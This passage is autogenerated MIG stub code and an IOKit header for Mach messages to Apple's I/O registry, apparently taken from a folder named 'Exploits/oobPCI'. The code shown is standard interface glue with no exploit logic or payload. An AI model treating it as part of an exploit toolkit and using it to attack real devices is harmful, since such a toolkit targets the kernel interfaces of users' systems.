#define __MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t(__Reply__io_registry_entry_get_properties_bin_buf_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_properties_bin_buf_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2988) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->properties.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->properties.size != Out0P->propertiesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_properties_bin_buf */
mig_external kern_return_t io_registry_entry_get_properties_bin_buf
(
	mach_port_t registry_entry,
	mach_vm_address_t buf,
	mach_vm_size_t *bufsize,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_vm_address_t buf;
		mach_vm_size_t bufsize;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_vm_size_t bufsize;
		mach_msg_type_number_t propertiesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_vm_size_t bufsize;
		mach_msg_type_number_t propertiesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t__defined */

	__DeclareSendRpc(2888, "io_registry_entry_get_properties_bin_buf")

	InP->NDR = NDR_record;

	InP->buf = buf;

	InP->bufsize = *bufsize;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2888;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2888, "io_registry_entry_get_properties_bin_buf")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2888, "io_registry_entry_get_properties_bin_buf")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t((__Reply__io_registry_entry_get_properties_bin_buf_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_properties_bin_buf_t__defined) */

	*bufsize = Out0P->bufsize;

	*properties = (io_buf_ptr_t)(Out0P->properties.address);
	*propertiesCnt = Out0P->propertiesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_property_bin_buf_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_property_bin_buf_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_property_bin_buf_t(__Reply__io_registry_entry_get_property_bin_buf_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_property_bin_buf_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2989) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->properties.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->properties.size != Out0P->propertiesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_property_bin_buf_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_property_bin_buf */
mig_external kern_return_t io_registry_entry_get_property_bin_buf
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t property_name,
	uint32_t options,
	mach_vm_address_t buf,
	mach_vm_size_t *bufsize,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
		uint32_t options;
		mach_vm_address_t buf;
		mach_vm_size_t bufsize;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_vm_size_t bufsize;
		mach_msg_type_number_t propertiesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_vm_size_t bufsize;
		mach_msg_type_number_t propertiesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_registry_entry_get_property_bin_buf_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_property_bin_buf_t__defined */

	__DeclareSendRpc(2889, "io_registry_entry_get_property_bin_buf")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->planeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 256) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->property_name, property_name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->property_name, property_name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->property_nameOffset = 0;

	msgh_size_delta = _WALIGN_(InP->property_nameCnt);
	msgh_size += msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	InP->options = options;

	InP->buf = buf;

	InP->bufsize = *bufsize;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2889;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2889, "io_registry_entry_get_property_bin_buf")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2889, "io_registry_entry_get_property_bin_buf")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_property_bin_buf_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_property_bin_buf_t((__Reply__io_registry_entry_get_property_bin_buf_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_property_bin_buf_t__defined) */

	*bufsize = Out0P->bufsize;

	*properties = (io_buf_ptr_t)(Out0P->properties.address);
	*propertiesCnt = Out0P->propertiesCnt;

	return KERN_SUCCESS;
}

```

`Exploits/oobPCI/Sources/generated/device.h`:

```h
#ifndef	_iokit_user_
#define	_iokit_user_

/* Module iokit */

#include <string.h>
#include <mach/ndr.h>
#include <mach/boolean.h>
#include <mach/kern_return.h>
#include <mach/notify.h>
#include <mach/mach_types.h>
#include <mach/message.h>
#include <mach/mig_errors.h>
#include <mach/port.h>
	
/* BEGIN VOUCHER CODE */

#ifndef KERNEL
#if defined(__has_include)
#if __has_include(<mach/mig_voucher_support.h>)
#ifndef USING_VOUCHERS
#define USING_VOUCHERS
#endif
#ifndef __VOUCHER_FORWARD_TYPE_DECLS__
#define __VOUCHER_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR
#define __VOUCHER_FOWARD_TYPE_DECLS_SINGLE_ATTR __unsafe_indexable
#endif
	extern boolean_t voucher_mach_msg_set(mach_msg_header_t * msg) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif // __VOUCHER_FORWARD_TYPE_DECLS__
#endif // __has_include(<mach/mach_voucher_types.h>)
#endif // __has_include
#endif // !KERNEL
	
/* END VOUCHER CODE */

	
/* BEGIN MIG_STRNCPY_ZEROFILL CODE */

#if defined(__has_include)
#if __has_include(<mach/mig_strncpy_zerofill_support.h>)
#ifndef USING_MIG_STRNCPY_ZEROFILL
#define USING_MIG_STRNCPY_ZEROFILL
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__
#ifdef __cplusplus
extern "C" {
#endif
#ifndef __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_ATTR
#define __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS_CSTRING_COUNTEDBY_ATTR(C) __unsafe_indexable
#endif
	extern int mig_strncpy_zerofill(char * dest, const char * src, int len) __attribute__((weak_import));
#ifdef __cplusplus
}
#endif
#endif /* __MIG_STRNCPY_ZEROFILL_FORWARD_TYPE_DECLS__ */
#endif /* __has_include(<mach/mig_strncpy_zerofill_support.h>) */
#endif /* __has_include */
	
/* END MIG_STRNCPY_ZEROFILL CODE */


#ifdef AUTOTEST
#ifndef FUNCTION_PTR_T
#define FUNCTION_PTR_T
typedef void (*function_ptr_t)(mach_port_t, char *, mach_msg_type_number_t);
typedef struct {
        char            * name;
        function_ptr_t  function;
} function_table_entry;
typedef function_table_entry   *function_table_t;
#endif /* FUNCTION_PTR_T */
#endif /* AUTOTEST */

#ifndef	iokit_MSG_COUNT
#define	iokit_MSG_COUNT	90
#endif	/* iokit_MSG_COUNT */

#include <Availability.h>
#include <mach/std_types.h>
#include <mach/mig.h>
#include <mach/mig.h>
#include <mach/mach_types.h>
#include <mach/mach_types.h>
#include <device/device_types.h>

#ifdef __BeforeMigUserHeader
__BeforeMigUserHeader
#endif /* __BeforeMigUserHeader */

#include <sys/cdefs.h>
__BEGIN_DECLS


/* Routine io_object_get_class */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_object_get_class
(
	mach_port_t object,
	io_name_t className
);

/* Routine io_object_conforms_to */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_object_conforms_to
(
	mach_port_t object,
	io_name_t className,
	boolean_t *conforms
);

/* Routine io_iterator_next */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_iterator_next
(
	mach_port_t iterator,
	mach_port_t *object
);

/* Routine io_iterator_reset */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_iterator_reset
(
	mach_port_t iterator
);

/* Routine io_service_get_matching_services */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_matching_services
(
	mach_port_t master_port,
	io_string_t matching,
	mach_port_t *existing
);

/* Routine io_registry_entry_get_property */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_property
(
	mach_port_t registry_entry,
	io_name_t property_name,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
);

/* Routine io_registry_create_iterator */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_create_iterator
(
	mach_port_t master_port,
	io_name_t plane,
	uint32_t options,
	mach_port_t *iterator
);

/* Routine io_registry_iterator_enter_entry */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_iterator_enter_entry
(
	mach_port_t iterator
);

/* Routine io_registry_iterator_exit_entry */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_iterator_exit_entry
(
	mach_port_t iterator
);

/* Routine io_registry_entry_from_path */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_from_path
(
	mach_port_t master_port,
	io_string_t path,
	mach_port_t *registry_entry
);

/* Routine io_registry_entry_get_name */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_name
(
	mach_port_t registry_entry,
	io_name_t name
);

/* Routine io_registry_entry_get_properties */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_properties
(
	mach_port_t registry_entry,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
);

/* Routine io_registry_entry_get_property_bytes */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_property_bytes
(
	mach_port_t registry_entry,
	io_name_t property_name,
	io_struct_inband_t data,
	mach_msg_type_number_t *dataCnt
);

/* Routine io_registry_entry_get_child_iterator */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_child_iterator
(
	mach_port_t registry_entry,
	io_name_t plane,
	mach_port_t *iterator
);

/* Routine io_registry_entry_get_parent_iterator */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_parent_iterator
(
	mach_port_t registry_entry,
	io_name_t plane,
	mach_port_t *iterator
);

/* Routine io_service_close */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_close
(
	mach_port_t connection
);

/* Routine io_connect_get_service */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_get_service
(
	mach_port_t connection,
	mach_port_t *service
);

/* Routine io_connect_add_client */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_add_client
(
	mach_port_t connection,
	mach_port_t connect_to
);

/* Routine io_connect_set_properties */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_set_properties
(
	mach_port_t connection,
	io_buf_ptr_t properties,
	mach_msg_type_number_t propertiesCnt,
	kern_return_t *result
);

/* Routine io_registry_entry_get_path */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_path
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_string_t path
);

/* Routine io_registry_get_root_entry */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_get_root_entry
(
	mach_port_t master_port,
	mach_port_t *root
);

/* Routine io_registry_entry_set_properties */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_set_properties
(
	mach_port_t registry_entry,
	io_buf_ptr_t properties,
	mach_msg_type_number_t propertiesCnt,
	kern_return_t *result
);

/* Routine io_registry_entry_in_plane */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_in_plane
(
	mach_port_t registry_entry,
	io_name_t plane,
	boolean_t *inPlane
);

/* Routine io_object_get_retain_count */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_object_get_retain_count
(
	mach_port_t object,
	uint32_t *retainCount
);

/* Routine io_service_get_busy_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_busy_state
(
	mach_port_t service,
	uint32_t *busyState
);

/* Routine io_service_wait_quiet */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_wait_quiet
(
	mach_port_t service,
	mach_timespec_t wait_time
);

/* Routine io_registry_entry_create_iterator */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_create_iterator
(
	mach_port_t registry_entry,
	io_name_t plane,
	uint32_t options,
	mach_port_t *iterator
);

/* Routine io_iterator_is_valid */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_iterator_is_valid
(
	mach_port_t iterator,
	boolean_t *is_valid
);

/* Routine io_catalog_send_data */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_catalog_send_data
(
	mach_port_t master_port,
	uint32_t flag,
	io_buf_ptr_t inData,
	mach_msg_type_number_t inDataCnt,
	kern_return_t *result
);

/* Routine io_catalog_terminate */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_catalog_terminate
(
	mach_port_t master_port,
	uint32_t flag,
	io_name_t name
);

/* Routine io_catalog_get_data */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_catalog_get_data
(
	mach_port_t master_port,
	uint32_t flag,
	io_buf_ptr_t *outData,
	mach_msg_type_number_t *outDataCnt
);

/* Routine io_catalog_get_gen_count */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_catalog_get_gen_count
(
	mach_port_t master_port,
	uint32_t *genCount
);

/* Routine io_catalog_module_loaded */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_catalog_module_loaded
(
	mach_port_t master_port,
	io_name_t name
);

/* Routine io_catalog_reset */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_catalog_reset
(
	mach_port_t master_port,
	uint32_t flag
);

/* Routine io_service_request_probe */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_request_probe
(
	mach_port_t service,
	uint32_t options
);

/* Routine io_registry_entry_get_name_in_plane */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_name_in_plane
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t name
);

/* Routine io_service_match_property_table */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_match_property_table
(
	mach_port_t service,
	io_string_t matching,
	boolean_t *matches
);

/* Routine io_connect_get_notification_semaphore */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_get_notification_semaphore
(
	mach_port_t connection,
	natural_t notification_type,
	semaphore_t *semaphore
);

/* Routine io_registry_entry_get_location_in_plane */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_location_in_plane
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t location
);

/* Routine io_registry_entry_get_property_recursively */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_registry_entry_get_property_recursively
(
	mach_port_t registry_entry,
	io_name_t plane,
	io_name_t property_name,
	uint32_t options,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
);

/* Routine io_service_get_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_state
(
	mach_port_t service,
	uint64_t *state,
	uint32_t *busy_state,
	uint64_t *accumulated_busy_time
);

/* Routine io_service_get_matching_services_ool */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_get_matching_services_ool
(
	mach_port_t master_port,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	kern_return_t *result,
	mach_port_t *existing
);

/* Routine io_service_match_property_table_ool */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_match_property_table_ool
(
	mach_port_t service,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	kern_return_t *result,
	boolean_t *matches
);

/* Routine io_object_get_superclass */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_object_get_superclass
(
	mach_port_t master_port,
	io_name_t obj_name,
	io_name_t class_name
);

/* Routine io_object_get_bundle_identifier */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_object_get_bundle_identifier
(
	mach_port_t master_port,
	io_name_t obj_name,
	io_name_t class_name
);

/* Routine io_service_open_extended */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_open_extended
(
	mach_port_t service,
	task_t owningTask,
	uint32_t connect_type,
	NDR_record_t ndr,
	io_buf_ptr_t properties,
	mach_msg_type_number_t propertiesCnt,
	kern_return_t *result,
	mach_port_t *connection
);

/* Routine io_connect_map_memory_into_task */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_map_memory_into_task
(
	mach_port_t connection,
	uint32_t memory_type,
	task_t into_task,
	mach_vm_address_t *address,
	mach_vm_size_t *size,
	uint32_t flags
);

/* Routine io_connect_unmap_memory_from_task */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_unmap_memory_from_task
(
	mach_port_t connection,
	uint32_t memory_type,
	task_t from_task,
	mach_vm_address_t address
);

/* Routine io_connect_method */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_method
(
	mach_port_t connection,
	uint32_t selector,
	io_scalar_inband64_t scalar_input,
	mach_msg_type_number_t scalar_inputCnt,
	io_struct_inband_t inband_input,
	mach_msg_type_number_t inband_inputCnt,
	mach_vm_address_t ool_input,
	mach_vm_size_t ool_input_size,
	io_struct_inband_t inband_output,
	mach_msg_type_number_t *inband_outputCnt,
	io_scalar_inband64_t scalar_output,
	mach_msg_type_number_t *scalar_outputCnt,
	mach_vm_address_t ool_output,
	mach_vm_size_t *ool_output_size
);

/* Routine io_connect_async_method */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_async_method
(
	mach_port_t connection,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	uint32_t selector,
	io_scalar_inband64_t scalar_input,
	mach_msg_type_number_t scalar_inputCnt,
	io_struct_inband_t inband_input,
	mach_msg_type_number_t inband_inputCnt,
	mach_vm_address_t ool_input,
	mach_vm_size_t ool_input_size,
	io_struct_inband_t inband_output,
	mach_msg_type_number_t *inband_outputCnt,
	io_scalar_inband64_t scalar_output,
	mach_msg_type_number_t *scalar_outputCnt,
	mach_vm_address_t ool_output,
	mach_vm_size_t *ool_output_size
);

/* Routine io_connect_set_notification_port */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_connect_set_notification_port
(
	mach_port_t connection,
	uint32_t notification_type,
	mach_port_t port,
	io_user_reference_t reference
);

/* Routine io_service_add_notification */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_add_notification
(
	mach_port_t master_port,
	io_name_t notification_type,
	io_string_t matching,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	mach_port_t *notification
);

/* Routine io_service_add_interest_notification */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_add_interest_notification
(
	mach_port_t service,
	io_name_t type_of_interest,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
	mach_port_t *notification
);

/* Routine io_service_add_notification_ool */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t io_service_add_notification_ool
(
	mach_port_t master_port,
	io_name_t notification_type,
	io_buf_ptr_t matching,
	mach_msg_type_number_t matchingCnt,
	mach_port_t wake_port,
	io_async_ref64_t reference,
	mach_msg_type_number_t referenceCnt,
